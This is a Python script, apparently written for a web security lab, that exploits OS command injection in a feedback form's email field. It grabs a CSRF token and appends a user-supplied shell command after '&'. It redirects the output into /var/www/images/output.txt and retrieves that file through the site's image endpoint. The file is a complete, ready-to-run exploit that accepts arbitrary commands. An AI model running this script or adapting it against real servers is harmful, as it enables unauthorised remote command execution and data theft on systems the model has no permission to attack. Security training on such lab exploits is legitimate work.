import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}



def get_csrf_token(s, url):
    feedback_path="feedback/"
    res=s.get(url=url+feedback_path, verify=False, proxies=proxies)
    soup=BeautifulSoup(res.text, 'html.parser')
    csrf=soup.find('input')['value']
    return csrf

def run_command(s, url, command):
    csrf_token=get_csrf_token(s, url)
    submit_feedback_path="feedback/submit"
    email_injection="me@me.com & "+command+" > /var/www/images/output.txt #"
    params={'csrf':csrf_token, 'name':'ali', 'email':email_injection, 'subject':'test', 'message':'testing email param'}
    s.post(url=url+submit_feedback_path, data=params, verify=False, proxies=proxies)

def get_output(s, url):
    output_file="image?filename=output.txt"
    res=s.get(url=url+output_file, verify=False, proxies=proxies)
    print(res.text)




def main():
    if len(sys.argv)!=3:
        print("[+] Usage: %s URL command" %sys.argv[0])
        print("[+] Example: %s http://www.example.com/ whoami" %sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    command=sys.argv[2]
    s=requests.session()

    print("(+) Running the command...")
    run_command(s, url, command)

    print("(+) Retrieving the output...")
    get_output(s, url)


if __name__ == "__main__":
    main()